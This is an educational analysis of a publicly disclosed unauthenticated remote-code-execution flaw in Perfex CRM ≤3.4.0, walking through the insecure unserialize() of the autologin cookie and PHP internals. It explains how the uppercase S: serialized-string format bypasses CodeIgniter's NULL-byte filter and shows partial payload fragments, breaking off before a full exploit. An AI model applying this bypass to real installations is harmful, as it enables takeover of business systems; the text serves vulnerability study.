# Perfex CRM ≤3.4.0: Exploratory Notes :)

This cookbook is my humble attempt to expand my understanding of real-world vulnerabilities by dissecting a publicly disclosed issue documented on the [NULL CATHEDRAL](https://nullcathedral.com/posts/2026-03-16-perfex-crm-unauthenticated-rce-insecure-deserialization/) blog. The goal is not just to study the exploit, but to understand the underlying mechanics, developer assumptions, and subtle failures that ultimately lead to system compromise.

The target of this analysis is **Perfex CRM**, a customer relationship management platform designed to handle business operations such as client management, invoicing, project tracking, support systems, and internal workflows. Built primarily using PHP and leveraging the **CodeIgniter** framework, Perfex CRM represents a typical modern web application stack—dynamic, stateful, and heavily reliant on user-supplied data.

This case study focuses on a critical vulnerability affecting versions ≤ 3.4.0, where user-controlled data from an autologin cookie is passed directly into PHP’s ```unserialize()``` function without proper validation. This introduces a weakness categorized as **CWE-502**, enabling unauthenticated attackers to achieve remote code execution.

What makes this vulnerability particularly interesting is not just the insecure deserialization itself, but the interplay between input filtering and PHP internals. Even though defensive mechanisms—such as CodeIgniter’s XSS filtering—attempt to sanitize malicious input, they fail in subtle ways that can be bypassed using lesser-known serialization techniques. The result is a chain of trust violations that transforms a simple cookie into a weaponized payload.

In the following sections, we will break down this vulnerability step by step—tracing the path from controlled input to full code execution, and uncovering how seemingly minor design decisions can lead to catastrophic consequences.

## The Vulnerable Call:

During initial inspection of the demo instance, the ```autologin``` cookie stood out immediately—it resembled serialized PHP data rather than a simple token or identifier. This is already a red flag. Cookies are user-controlled by design, and seeing structured data inside them often hints at deeper trust issues.

After reviewing the source code, the suspicion was confirmed: the cookie value is passed directly into PHP’s ```unserialize()``` function without any validation or integrity checks. This is a textbook case of object injection and the root of the vulnerability.

To understand why this is dangerous, we need to briefly explore how PHP serialization works.

PHP’s ```serialize()``` function converts data structures (including objects) into a string format that can later be restored using ```unserialize()```. For example:

```
O:8:"stdClass":1:{s:3:"foo";s:3:"bar";}
```

This represents an object (```O```) of class ```stdClass```, with one property (```foo```) holding the value ```bar```.

Now here’s the critical part: when ```unserialize()``` processes such input, it doesn’t just rebuild data—it can also **instantiate objects and trigger magic methods** like ```__wakeup()``` or ```__destruct()``` automatically.

So if an attacker can control serialized input, they can potentially construct a malicious object that executes code as a side effect of being “restored.” And in this case? That input is coming straight from a cookie.

### Additional Notes on Magic Methods – The Hidden Triggers:

In PHP, **magic methods** are special functions that automatically execute when certain events happen to an object. The dangerous ones in our context:

- ```__wakeup()``` → runs when an object is **unserialized**

- ```__destruct()``` → runs when an object is **destroyed** (end of script, or no references left)

So imagine this:

You feed ```unserialize()``` a crafted object…
PHP rebuilds it…
…and *silently executes code inside it.*

**Quick analogy (Python style):**

- PHP ```__wakeup()``` ≈ Python ```__setstate__()``` (used during unpickling or the process of converting a byte stream back into a Python object using the ```pickle``` module.)

- PHP ```__destruct()``` ≈ Python ```__del__()``` (called when object is garbage collected)

But here’s the twist: PHP historically made it *way easier* to shoot yourself in the foot with this.

**What does ```$this->``` actually mean?**

```$this``` is simply **“this current object instance.”** So when you see:

```
$this->autologin();
```

It means: *“call the ```autologin()``` method that belongs to* ***this specific object.”***

Or:

```
$this->load->model('authentication_model');
```

This is chaining:

- ```$this->load``` → access a property called ```load``` (an object)

- ```->model()``` → call its method

*Python equivalent:*

```
self.autologin()
self.load.model("authentication_model")
```

Same concept, different syntax: ```$this``` in PHP = ```self``` in Python.

**Constructors vs Methods (the relationship):**

A **constructor** is just a special method that runs automatically when an object is created.

In PHP:

```
public function __construct() {
    $this->autologin();
}
```

In Python:

```
def __init__(self):
    self.autologin()
```

So when the object is created:

1. Constructor runs

2. Constructor calls ```autologin()```

3. ```autologin()``` does its thing

*Now connect the dots:*

- ```unserialize()``` creates an object

- Object creation can trigger ```__wakeup()```

- Later, cleanup triggers ```__destruct()```
 
- Constructors may call other methods automatically

- Those methods may process attacker-controlled data

So a single payload can: *create object, trigger magic method, call internal logic, execute attacker-controlled behavior.* All *without* explicitly calling anything.

### Automatic Execution via Controller:

The application ensures that authentication logic runs on every request through the base controller.

From ```core/App_Controller.php```:

```
$this->load->model('authentication_model');
$this->authentication_model->autologin();
```

Let’s break this down line by line:

- ```$this->load->model('authentication_model');```

This tells the **CodeIgniter** loader to include and initialize the ```authentication_model```. This model contains logic related to user authentication.

- ```$this->authentication_model->autologin();```

Immediately after loading, the ```autologin()``` method is invoked. This means that **every incoming request** will process autologin logic—whether the user is authenticated or not. This is important. It means the attack surface is exposed *universally,* without requiring prior access or interaction.

### Redundant Invocation in the Model:

The situation becomes even more interesting inside the model itself.

From ```models/Authentication_model.php```:

```
public function __construct()
{
    parent::__construct();
    $this->load->model('user_autologin');
    $this->autologin();
}
```

Again, line by line:

- ```public function __construct()```

This is the constructor, automatically executed whenever the model is instantiated.

- ```parent::__construct();```

Calls the parent class constructor to ensure proper initialization within the framework.

- ```$this->load->model('user_autologin');```

Loads an additional model responsible for handling autologin-specific operations (likely database interactions or cookie handling).

- ```$this->autologin();```

This is the critical part: the ```autologin()``` method is invoked *again,* this time during object construction.

This dual invocation creates a subtle but powerful condition: the ```autologin()``` method is triggered automatically *on every request and even during object initialization itself.* This means that any vulnerable logic inside ```autologin()```—such as unsafe deserialization—gets executed in a highly predictable and unavoidable way. There is no need for the attacker to “reach” the vulnerable code path. The application *walks into it on its own,* every single time. A cookie gets whispered into the system, the system accepts it without question and somewhere deep inside, ```unserialize()``` begins to *reconstruct a reality the attacker chose.*

### The ```autologin()``` Method:

```
public function autologin()
{
    if (!is_logged_in()) {
        $this->load->helper('cookie');
        if ($cookie = get_cookie('autologin', true)) {
            $data = unserialize($cookie);
            if (isset($data['key']) and isset($data['user_id'])) {
```

At first glance, this looks like harmless convenience logic—automatically logging users back in if a cookie is present. But every line quietly builds toward the vulnerability. Let’s dissect it carefully.

*1. Authentication Check:*

```
if (!is_logged_in()) {
```

This condition ensures that the autologin logic only runs for users who are not *already authenticated.* Sounds reasonable—but in practice, this means: *unauthenticated users fully control this code path.* That’s already a dangerous place to be handling sensitive operations.

*2. Loading the Cookie Helper:*

```
$this->load->helper('cookie');
```

Within *CodeIgniter,* helpers are utility modules. This line enables access to functions like:

- ```get_cookie()```

- ```set_cookie()```

Nothing dangerous here by itself—but it prepares the system to interact with user-controlled input.

*3. Retrieving the Cookie:*

```
if ($cookie = get_cookie('autologin', true)) {
```

This line does two things at once:

- Retrieves the value of the ```autologin``` cookie

- Assigns it to ```$cookie``` if it exists

The second argument (```true```) enables XSS filtering. At a glance, this feels like security, but it’s misleading. XSS filtering is designed to sanitize **HTML/JavaScript payloads**, not structured binary-like formats such as serialized PHP objects. So effectively: *the application believes it sanitized the input, but the data remains structurally dangerous.*

*4. The Critical Line:*

```
$data = unserialize($cookie);
```

**This is the vulnerability.** User-controlled cookie data is passed directly into ```unserialize()``` with:

- No validation

- No integrity check (e.g., HMAC)

- No type enforcement

At this point, the attacker controls what gets reconstructed in memory. And as we discussed earlier:

→ This can instantiate arbitrary objects

→ Trigger magic methods like ```__wakeup()``` or ```__destruct()```

→ Execute unintended code paths

*5. Superficial Validation:*

```
if (isset($data['key']) and isset($data['user_id'])) {
```

After deserialization, the application checks for expected array keys. This gives a false sense of safety because the dangerous part has *already happened.* Even if this condition fails:

- The object has already been created

- Magic methods may have already executed

So this check only validates *data usage, not data safety.*

**Additional Notes:**

Repetition is the mother of learning, so here's microscopic breakdown of:

```
if (isset($data['key']) and isset($data['user_id'])) {
```

- ```if```: basic control structure, only executing the following block *if the condition is true* (same as Python)

- ```(``` and ```)```: these wrap the condition being evaluated. PHP *requires parentheses* here, unlike Python which relies on indentation.

- ```isset(...)```: a built-in PHP function, checks whether a variable *exists AND is not* ```null```

So:

```
isset($data['key'])
```

Means: *“Does ```$data['key']``` exist, and is it not ```null```?”* Python equivalent would be something like:

```
'key' in data and data['key'] is not None
```

- ```$data```: a variable (arrays in PHP use ```$```).

From earlier:

```
$data = unserialize($cookie);
```

So ```$data``` is whatever came out of that dangerous deserialization step.

- ```['key']```: Array access, meaning *“give me the value stored under ```'key'``` inside ```$data```”*

Python equivalent:

```
data['key']
```

- ```and```: logical AND operator. Both conditions must be true. PHP has *two AND operators:*

1. ```and``` (low precedence)

2. ```&&``` (high precedence, more commonly used)

So this:

```
isset($data['key']) and isset($data['user_id'])
```

means: *“check BOTH fields exist”. If ```$data``` contains both ```'key'``` and ```'user_id'```, then proceed.”*

**Important Subtlety (the trap):**

This check happens *AFTER:*

```
$data = unserialize($cookie);
```

So even if this condition fails, the dangerous action (object creation + magic methods) has already happened. This line is basically *too late to matter for security.*

**Reminders about PHP Whitespace vs Python:**

This is where PHP and Python diverge hard. In PHP whitespace is mostly *irrelevant.* This works:

```
if(isset($data['key'])and isset($data['user_id'])){
```

And so does this:

```
if ( isset( $data['key'] ) and isset( $data['user_id'] ) ) {
```

What *actually matters:*

- ```;``` → ends statements

- ```{ }``` → defines code blocks

In Python whitespace is everything.

```
if condition:
    do_something()
```

*In this ```autologin()``` case:*

```
if (...) {
    // code block
}
```

The ```{ }``` define scope—not indentation. So this:

```
if (...) {
echo "hi";
}
```

is just as valid as:

```
if (...) {
    echo "hi";
}
```

Overall, indentation is for humans, not the interpreter.

**Now, let’s connect this with everything we’ve uncovered so far.** From earlier:

- The ```autologin()``` method is called:

	- On every request (via controller)
	
	- During object construction (via constructor)
	
Now add this:

- The method pulls data from a cookie (attacker-controlled)

- That data is passed directly into ```unserialize()```

This creates a perfect storm:

→ *Every request becomes a deserialization trigger*

→ *No authentication required*

→ *No user interaction required*

→ *No validation barrier exists before execution*

The vulnerability is not just “unsafe deserialization.” It’s the combination of:

- Blind trust in client-side data (cookies)

- Misapplied security (XSS filtering instead of integrity validation)

- Automatic execution paths (constructor + controller)

- And PHP’s dangerous object lifecycle behavior

## The XSS Filter Problem:

At this point, everything seemed straightforward: control the cookie → inject serialized payload → trigger ```unserialize()``` → profit. But reality pushed back. The first payload failed. Why? Because the application wasn’t just reading the cookie—it was *filtering* it.

### Cookie Retrieval with XSS Filtering:

From ```system/helpers/cookie_helper.php```:

```
function get_cookie($index, $xss_clean = NULL)
{
    is_bool($xss_clean) OR $xss_clean = (config_item('global_xss_filtering') === TRUE);
    $prefix = isset($_COOKIE[$index]) ? '' : config_item('cookie_prefix');
    return get_instance()->input->cookie($prefix.$index, $xss_clean);
}
```

**Step-by-Step Breakdown:**

*1. Function Signature:*

```
function get_cookie($index, $xss_clean = NULL)
```

- ```$index``` → name of the cookie (```'autologin'```)

- ```$xss_clean``` → whether to apply XSS filtering

*2. Boolean Check Trick:*

```
is_bool($xss_clean) OR $xss_clean = (config_item('global_xss_filtering') === TRUE);
```

This line looks odd, but it’s a compact PHP idiom. It means: *“if ```$xss_clean``` is NOT a boolean, assign it based on global config.”*

So:

- If you pass ```true``` → filtering is forced ON

- If you pass ```false``` → filtering is OFF

- If ```NULL``` → fallback to configuration

In our case:

```
get_cookie('autologin', true)
```

→ XSS filtering is explicitly enabled.

*3. Cookie Prefix Logic:*

```
$prefix = isset($_COOKIE[$index]) ? '' : config_item('cookie_prefix');
```

This checks:

- If the cookie exists as-is → use it directly

- Otherwise → prepend a configured prefix

Not security-relevant here, just flexibility.

**Additional Notes:**

It may be wise to say something about the *ternary operator* (```? :```) in PHP. This line:

```
$prefix = isset($_COOKIE[$index]) ? '' : config_item('cookie_prefix');
```

uses the *ternary operator,* which is basically a compact ```if-else```. General form:

```
condition ? value_if_true : value_if_false;
```

*Breaking this exact line down:*

First we have this condition:

```
isset($_COOKIE[$index])
```

→ *“Does this cookie already exist?”*

If TRUE → return:

```
''
```

→ an *empty string*

If FALSE → return:

```
config_item('cookie_prefix')
```

→ some predefined prefix from configuration

Same logic, written the long way:

```
if (isset($_COOKIE[$index])) {
    $prefix = '';
} else {
    $prefix = config_item('cookie_prefix');
}
```

Python equivalent:

```
prefix = '' if index in cookies else config_item('cookie_prefix')
```

Same idea, just flipped syntax.

*Why this even exists?* Frameworks sometimes allow cookie names like:

```
myapp_autologin
```

instead of:

```
autologin
```

As stated before, this logic says:

- If the cookie is already present as ```autologin``` → use it directly

- If not → try ```prefix + autologin```

(...this is the end of *Additional Notes*...)

*4. Final Call:*

```
return get_instance()->input->cookie($prefix.$index, $xss_clean);
```

This hands off processing to CodeIgniter’s input handler. And this is where things get interesting.

### The Invisible Character Filter:

Deep inside *CodeIgniter*, input is sanitized using a function called:

```
remove_invisible_characters()
```

From ```system/core/Common.php```:

```
$non_displayables[] = '/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S';
```

This is a *regular expression.* Let’s decode it:

- ```\x00-\x08``` → ASCII control characters (including NULL byte ```\x00```)

- ```\x0B\x0C``` → vertical tab & form feed

- ```\x0E-\x1F``` → more non-printable control characters

- ```\x7F``` → DEL character

The ```+``` means: *“match one or more of these characters”* So effectively: *remove all non-printable characters from input.*

### Private Property Encoding:

Why this breaks exploitation? Now we hit a critical detail about PHP serialization. When PHP serializes *private properties,* it uses NULL bytes as part of the structure:

```
\x00ClassName\x00property
```

These NULL bytes are not decoration—they are *essential metadata.* Example:

```
s:17:"\x00ClassName\x00prop"
```

Breakdown:

- ```s:17``` → string of length 17

- ```"\x00ClassName\x00prop"``` → actual content

**The filter removes NULL bytes:**

```
Before:  "\x00ClassName\x00prop"
After:   "ClassNameprop"
```

So now:

```
s:17:"ClassNameprop"
```

Not the string length (```17```) **no longer matches the actual content.**

→ Serialized format becomes *corrupted*

→ ```unserialize()``` fails

→ Payload dies

At this point, it looks like the filter accidentally saved the day:

- It strips critical bytes

- It breaks serialized structure

- It prevents object reconstruction

**But Here’s the Twist:**

The filter operates on *raw input bytes.* But ```unserialize()``` interprets structured data. So the real question becomes: ***what if we could represent the same structure without using literal NULL bytes?*** If such a representation exists:

- The filter has nothing to remove

- The structure remains valid

- ```unserialize()``` reconstructs the object anyway

That’s where things shift from *“blocked exploit”* to *“clever bypass.”* A defense mechanism blindly scrubs away what it cannot see, but the attacker doesn’t need to hide the payload—only to *speak a language the filter doesn’t understand.*

### The ```S:``` Format Bypass:

After the initial payload failed due to XSS filtering, the investigation shifted deeper—into PHP itself. The key question became: *how exactly does ```unserialize()``` interpret input?* To answer that, the researcher explored the PHP source code—specifically the file responsible for parsing serialized data: ```ext/standard/var_unserializer.re```

Before diving into the code, let’s clarify what we’re looking at. A **lexer (lexical analyzer)** is a component that reads raw input (a stream of characters) and breaks it into meaningful pieces called **tokens**. In this case:

- Input → serialized string (from cookie)

- Output → structured data (arrays, objects, strings)

So the lexer inside ```unserialize()``` is responsible for interpreting things like:

```
s:3:"abc";
O:8:"stdClass":0:{}
```

Each part (```s```, ```O```, ```:```, ```"..."```) is a token with meaning.

**Lowercase ```s:``` vs Uppercase ```S:```**

Normally, PHP uses:

```
s:<length>:"value";
```

Example:

```
s:3:"abc";
```

This means:

- ```s``` → string

- ```3``` → length

- ```"abc"``` → raw string content

**The Hidden Variant: ```S:```**

There exists an *uppercase* ```S:``` variant:

```
S:<length>:"value";
```

But here’s the twist: it **interprets escape sequences like ```\xx``` (hex values)** So instead of raw bytes, it allows encoded ones!

**Why (and How) This Matters?**

Recall the earlier problem:

- XSS filter removes NULL bytes (```\x00```)

- Serialized payload breaks

- Exploit fails

But with ```S:```:

```
S:3:"\00A\00"
```

This is **pure printable ASCII:**

- ```\``` → backslash

- ```0```, ```0``` → characters

- no actual NULL byte present

So:

→ Filter sees nothing suspicious

→ Leaves it untouched

→ ```unserialize()``` later converts ```\00``` → ```\x00``` (real NULL byte)

**Result:** The payload passes through the filter and reconstructs itself *after* the filter is done.

### Deep Dive: The Unserializer Code!

Now let’s break down the actual logic responsible for this behavior.

```
if (**p != '\\') {
    ZSTR_VAL(str)[i] = (char)**p;
} else {
    unsigned char ch = 0;

    for (j = 0; j < 2; j++) {
        (*p)++;
        if (**p >= '0' && **p <= '9') {
            ch = (ch << 4) + (**p -'0');
        } else if (**p >= 'a' && **p <= 'f') {
            ch = (ch << 4) + (**p -'a'+10);
        } else if (**p >= 'A' && **p <= 'F') {
            ch = (ch << 4) + (**p -'A'+10);
        } else {
            zend_string_efree(str);
            return NULL;
        }
    }
    ZSTR_VAL(str)[i] = (char)ch;
}
```

**Line-by-Line Breakdown:**

```
if (**p != '\\') {
```

- ```p``` → pointer to current position in input string

- ```**p``` → current character

Check: *“Is this NOT a backslash (```\```)?”*

- In C, ```'\'``` is the *backslash character*

- But ```\``` is also used for escape sequences (```\n```, ```\t```, ```\\```, etc.)

So to represent a literal backslash, you must *escape it:* ```'\\'```

Overall, this line really means: *If the current character is NOT a backslash (```\```)…”*

```
ZSTR_VAL(str)[i] = (char)**p;
```

- Copy the character **as-is** into the output string

- In other words: *“Take the current character from input and copy it into position ```i``` of the output string.”*

- Normal behavior (no escaping)

Also, ```ZSTR_VAL``` comes from PHP’s internal engine (Zend Engine). In simple terms: ```ZSTR_VAL(str)``` gives you a pointer to the *raw character buffer* of a string. Think of it like: *give me the actual bytes inside this string so I can manipulate them directly”.*

Python analogy:

```
list_of_chars[i] = some_char
```

Except in C, strings are just arrays of bytes.

But wait: what is ```(str)[i]``` doing? This means: *“cccess the i-th character of the string buffer”.* So:

- ```ZSTR_VAL(str)``` → pointer to start of string

- ```[i]``` → offset into that string

To clarify this situation in C:

- A string = *array of bytes*

- Each byte = integer (0–255)

So yes, it *is essentially* an array of integers representing characters. Example:

```
"A" → 65
"\x00" → 0
```

But wait again: what about ```(char)**p```?

- ```p``` → pointer to pointer (```char **p```)

- ```*p``` → pointer to current position (i.e. current character)

- ```**p``` → actual character at that position

Then:

```
(char)**p
```

→ cast it explicitly to a character

*Putting It All Together:*

```
if (**p != '\\') {
    ZSTR_VAL(str)[i] = (char)**p;
}
```

- This means: *“If this is a normal character (not a backslash), just copy it directly into the output string.”*

Overall, this is the “normal path” of parsing. But the moment it sees a backslash, it switches into *escape decoding mode.* If input is plain → copy it. If input is special → *transform it!* That transformation step is exactly what allows harmless-looking ASCII → dangerous binary payload.

Now moving on to the next section:

```
} else {
```

If we **do** encounter a backslash: *start escape sequence handling!*

```
unsigned char ch = 0;
```

- Initialize a variable to build the decoded byte

- ```unsigned int``` → usually **4 bytes (32 bits)**

- ```unsigned char``` → **1 byte (8 bits)**

So this is a *tiny integer*, not a full-sized one because this code is building *raw bytes*. If this were just ```char``` (signed), values above 127 could become negative. Example:

```
200 → might become -56 (depending on system)
```

That would break binary handling, so ```unsigned char``` guarantees correct byte values (0–255).

Also, think of ```ch``` as a tiny container that slowly “assembles” one byte from two hex digits.

```
for (j = 0; j < 2; j++) {
```

- Loop exactly **twice** because ```\xx``` = two hex characters

This is classic C-style looping, and yeah—it looks weird compared to Python. Those semicolons split the loop into **three distinct actions:**

```
for ( initialization ; condition ; update )
```

Here is the expanded meaning:

1. Initialization:

```
j = 0;
```

→ Start j at 0 (this runs once, at the beginning)

2. Condition:

```
j < 2;
```

→ Keep looping *while this is true.*

3. Update:

```
j++
```

→ After each loop iteration: “increase ```j``` by 1”

**Equivalent long form:**

```
for (j = 0; j < 2; j++) {
    // code
}
```

This is the same as:

```
j = 0;
while (j < 2) {
    // code
    j++;
}
```

Python equivalent:

```
for j in range(2):
    # code
```

Now moving on to the next piece:

```
(*p)++;
```

- Advance pointer to next character

But the *parentheses* are the real story here. This is about **operator precedence** (who gets evaluated first).

Without parentheses:

```
*p++;
```

This does NOT mean what you think. Because ```++``` has higher precedence than ```*```, this becomes:

```
*(p++)
```

Meaning: *“increment ```p``` itself (the pointer-to-pointer), then dereference (access the value stored at the memory address pointed to by a pointer, using the dereference operator (```*```).”* That would move the *outer pointer,* not the inner one.

With parentheses:

```
(*p)++;
```

Now we force order:

1. ```*p``` → dereference once → get inner pointer

2. ```(*p)++``` → increment that inner pointer

So: *“move the current position inside the string forward by one character.”* But wait: **how this fits into the loop**

We need to connect it with:

```
for (j = 0; j < 2; j++) {
    (*p)++;
    if (**p >= '0' && **p <= '9') { ... }
}
```

Flow of execution time! Let’s say input is: ```\41```

**Step 0 (before loop):**

- ```**p``` = ```'\'```

- we enter escape mode

**Iteration 1 (```j = 0```):**

```
(*p)++;
```

→ move forward → now at ```'4'```

Then:

```
**p
```

→ reads ```'4'```

**Iteration 2 (```j = 1```):**

```
(*p)++;
```

→ move forward → now at ```'1'```

Then:

```
**p
```

→ reads '1'

The pointer movement happens **before reading:**

- move → read → process (two times!)

So the loop is literally *walking through the string,* character by character.

But wait: how does this relate to ```**p``` in the next section of our this code? Simple! Again:

- ```(*p)++``` → moves the pointer

- ```**p``` → reads whatever it now points to

*Think of it like this:*

- ```p``` → your finger pointing at a bookmark

- ```(*p)++``` → slide your finger one letter forward

- ```**p``` → look at the letter under your finger

This tiny dance:

```
(*p)++;
**p
```

…is what allows the parser to walk across a fake reality; reading characters that *look harmless* and quietly assembling something entirely different underneath.

Here is what comes next:

```
if (**p >= '0' && **p <= '9') {
ch = (ch << 4) + (**p - '0');
}
```

If character is ```0–9``` (both must be true):

- Convert ASCII digit → numeric value (**characters in C are just numbers in ASCII**)

- ```&&``` means logical AND (indeed!)

- Shift previous value left (hex building)

- Add new value

So this line:

```
if (48 <= **p <= 57)
```

Means: *“is this a numeric digit?”* Here is why this works:

```
| Char  | Value |
| ----- | ----- |
| `'0'` | 48    |
| `'9'` | 57    |
```

**The real magic line:**

```
ch = (ch << 4) + (**p - '0');
```

Means: *“Take the current value, shift it left (make room for next hex digit), then add the new digit.”*

But wait: **how it’s actually evaluated?** In C, operators follow **precedence rules**, not “left-to-right vs right-to-left” in the way we’re sometimes imagining. Here’s what happens conceptually:

1. Evaluate both sides of ```+```:

- Left: ```(ch << 4)```

- Right: ```(**p - '0')```

2. Then:

- Add them together

- Assign result to ```ch```

So why did we explain ```(**p - '0')``` first in the upcoming breakdowns? Purely for easier understanding, not execution order. Because:

- ```(**p - '0')``` → gives you the *new digit*

- ```(ch << 4)``` → prepares the *existing value*

So mentally it’s easier to think: *“What new digit am I adding?”* and then *“Where do I put it?”*

**Part 1 breakdown: ```(**p - '0')```:**

This converts a *character to number.* Example:

```
'4' - '0' = 4
'9' - '0' = 9
```

Because:

- ```'4'``` = 52

- ```'0'``` = 48

- 52 - 48 = 4

So: *“Turn ASCII digit into actual numeric value.”*

**Part 2 breakdown: ```(ch << 4)```:**

This is a *bitwise left shift!*

```
ch << 4
```

Means: *“shift bits 4 places to the left.”*

Which is the same as: *multiply by 16.* But wait: why 16? Because we’re building a *hexadecimal value (base 16).* Each hex digit represents 4 bits → hence shift by 4.

**Step-by-step example with ```\41```:**

We process ```'4'``` then ```'1'```.

*Iteration 1 (```'4'```):*

```
ch = 0
```

Then:

```
ch = (0 << 4) + 4 = 4
```

*Iteration 2 (```'1'```):*

```
ch = (4 << 4) + 1
   = (4 * 16) + 1
   = 64 + 1
   = 65
```

Final result:

```
ch = 65 → 'A'
```

This line is basically doing:

```
hex_value = previous_digits * 16 + new_digit
```

Same as how you’d manually compute:

```
"41" (hex) = 4 * 16 + 1 = 65
```

This is the moment where:

```
\00 → becomes → NULL byte
\41 → becomes → 'A'
```

Here is what follows next in the code:

```
else if (**p >= 'a' && **p <= 'f') {
    ch = (ch << 4) + (**p - 'a' + 10);
}
```

- Handle lowercase hex (```a–f``` → ```10–15```)

The line in question here:

```
ch = (ch << 4) + (**p - 'a' + 10);
```

This handles **hex characters** ```a–f```. First, in hexadecimal:

```
| Char  | Value |
| ----- | ----- |
| `'a'` | 10    |
| `'b'` | 11    |
| `'c'` | 12    |
| `'d'` | 13    |
| `'e'` | 14    |
| `'f'` | 15    |
```

So we need to convert:

```
'a' → 10
'b' → 11
...
'f' → 15
```

*Step-by-step breakdown (Part 1):*

```
**p - 'a'
```

- ```'a' - 'a' = 0```

- ```'b' - 'a' = 1```

- ...and so forth...

- ```'f' - 'a' = 5```

So now we have:

```
0 → 5
```

*Part 2:*

```
+ 10
```

Now we shift that range up into **hex space:**

```
0 + 10 = 10
1 + 10 = 11
...
5 + 10 = 15
```

But wait: why not just subtract something else? Because ASCII is not *aligned* with hex values. Example:

```
| Char  | ASCII |
| ----- | ----- |
| `'a'` | 97    |
| `'0'` | 48    |
```

So:

- ```'a' - '0'``` → meaningless here

- ```'a' - 'a'``` → gives clean 0–5 range

Then we manually shift into the correct hex range with ```+ 10```.

*Compare with digits case:*

```
(**p - '0')
```

already gives:

```
'0' → 0
'9' → 9
```

No adjustment needed.

So:

```
(**p - 'a' + 10)
```

means: *“convert a hex letter (```a–f```) into its numeric value (```10–15```).”*

**Example: ```'c'```**

```
'c' - 'a' = 2
2 + 10 = 12
```

Correct hex value for the letter ```C```. Overall, this whole parser is doing:

- digits → base 10 conversion

- letters → base 16 extension

So it’s reconstructing:

```
0–9 → 0–9
a–f → 10–15
```

And finally the last piece of the puzzle:

```
else if (**p >= 'A' && **p <= 'F') {
ch = (ch << 4) + (**p - 'A' + 10);
}
```

- Handle uppercase hex (```A–F```)

Overall, this is exactly *the same logic,* just for uppercase letters. What’s different? Only this part:

```
(**p - 'A' + 10)
```

Instead of:

```
(**p - 'a' + 10)
```

However, ASCII treats uppercase and lowercase differently and we need a separate branch:

```
| Char  | ASCII |
| ----- | ----- |
| `'A'` | 65    |
| `'a'` | 97    |
```

So:

- ```'A' - 'A' = 0```

- ```'a' - 'A' = 32``` (wrong range)

That’s why we need two separate conditions.

**Example: ```'B'```**

```
'B' - 'A' = 1
1 + 10 = 11
```

Correct hex value!

Here's the big picture again as the parser is basically doing:

```
if digit → 0–9
if a–f → 10–15
if A–F → 10–15
```

So all valid hex characters are covered.

In the continuation:

```
else {
    zend_string_efree(str);
    return NULL;
}
```

If invalid hex character:

→ Free memory

→ Abort parsing

Last but not least, we have this:

```
ZSTR_VAL(str)[i] = (char)ch;
```

- After processing both hex digits: *store the resulting byte in the string.*

Now let’s decode the syntax details for better clarity!

**Part 1: The brackets ```[i]```**

```
ZSTR_VAL(str)[i]
```

This is **array indexing.** Earlier we said:

- ```ZSTR_VAL(str)``` → pointer to the start of the string buffer

- Strings in C = arrays of bytes

So: ```[i]``` means *“go to the i-th position in that string”* If the string buffer is:

```
[ ?, ?, ?, ?, ... ]
  0  1  2  3
```

Then:

```
ZSTR_VAL(str)[2]
```

→ accesses position ```2```

So here:

```
ZSTR_VAL(str)[i] = ...
```

Means: *“write a value into position ```i``` of the output string.”*

**Part 2: ```(char)ch```**

This is a **type cast.** What is a cast? Basically: *“force this value to be treated as a specific type.”*

In this case:

- ```ch``` → already an ```unsigned char``` (0–255)

- ```(char)``` → convert it into a ```char```

But why cast at all? Two reasons:

1. Clarity / intent:

→ *“We are writing a character into the string.”*

2. Type consistency:

→ the string buffer expects ```char```, not ```unsigned char```

Practical effect? Usually none here (since both are 1 byte), but:

- ensures correct interpretation

- avoids compiler warnings

- keeps behavior predictable

**Full flow:**

After processing something like: ```\41```

- we get: ```ch = 65``` ```('A')```

Then:

```
ZSTR_VAL(str)[i] = (char)ch;
```

→ writes ```'A'``` into the string

This is the *moment of creation.* Everything before was about parsing, shifting, decoding. And here: *the raw byte finally becomes part of the string.*

***In Simple Terms:***

This entire block says: *“If you see ```\xx```, convert it into the actual byte it represents.”*

So:

- ```\00``` → NULL byte

- ```\41``` → ```A```

### Historical Oddity: Why Does ```S:``` Even Exist?

This is where things get almost absurd.

- PHP 6 (never released) planned Unicode changes

- Needed a safe way to represent binary strings

- Introduced escaped format (```S:```)

- Backported to PHP 5 for compatibility

But:

- PHP 6 never shipped

- ```S:``` was never used in real output

- No tests covered it

- It stayed hidden in the parser for *18 years*

- Only deprecated in PHP 8.4.

So now we have:

- Filter removes NULL bytes

- ```S:``` avoids literal NULL bytes

- Unserializer reconstructs them anyway

The filter operates on *what the data looks like.* The parser operates on *what the data means.* And those two realities don’t match. The system tries to clean the input—scrubbing away invisible characters—but the payload doesn’t need to *be* invisible. It just needs to *become invisible later.*

### More Obstacles:

With the NULL byte restriction bypassed using the ```S:``` format, the payload could now survive initial filtering. However, constructing a fully working exploit still required overcoming several additional hurdles. Each of these reveals something deeper about how PHP, frameworks, and real-world code *interact in unexpected ways.*

#### 1. Namespaces and Private Property Encoding:

**The Problem:**

When PHP serializes **private properties**, it doesn’t just store the property name. It encodes it like this:

```
\x00ClassName\x00property
```

But when namespaces are involved, the **full namespace is included:**

```
\x00GuzzleHttp\Cookie\CookieJar\x00cookies
```

*Why this breaks?* In ```S:``` format, escape sequences must follow strict rules:

```
\xx  → where x = valid hex digit (0–9, a–f, A–F)
```

So when the parser sees ```\Co``` it interprets:

- ```\C``` → valid hex start (```C``` = 12)

- ```o``` → invalid hex digit

→ Parsing fails.

But wait: where does ```\Co``` come from again? To clarify, the original serialized property name is:

```
\x00GuzzleHttp\Cookie\CookieJar\x00cookies
```

Look at this part:

```
\Cookie
```

Now imagine the parser reading this *character by character.* When it hits ```\Cookie``` it doesn’t think: *“Ah, a namespace separator.”* Instead, it thinks: *“Backslash? Oh, this must be a hex escape!”* So:

```
\Co → invalid escape sequence → parser error
```

The solution: *escaping backslashes!* To represent a literal backslash (```\```), we encode it as ```\5c``` because ```0x5c = '\'```.

*Final Payload Form:*

```
S:36:"\00GuzzleHttp\5cCookie\5cCookieJar\00cookies"
```

The parser doesn’t understand “namespace separators”; it only understands **hex escape sequences.** So we must encode *every backslash* in a way it accepts.

#### 2. XSS Filter Breaking PHP Tags:

**The Problem:**

CodeIgniter applies XSS filtering using ```xss_clean()```.

From ```system/core/Security.php```:

```
$str = str_replace(array('<?', '?'.'>'), array('&lt;?', '?&gt;'), $str);
```

What is happening here? This line replaces:

```
| Original | Replaced with |
| -------- | ------------- |
| `<?`     | `&lt;?`       |
| `?>`     | `?&gt;`       |
```

Why? These are *PHP open/close tags.* Example:

```
<?php echo "hi"; ?>
```

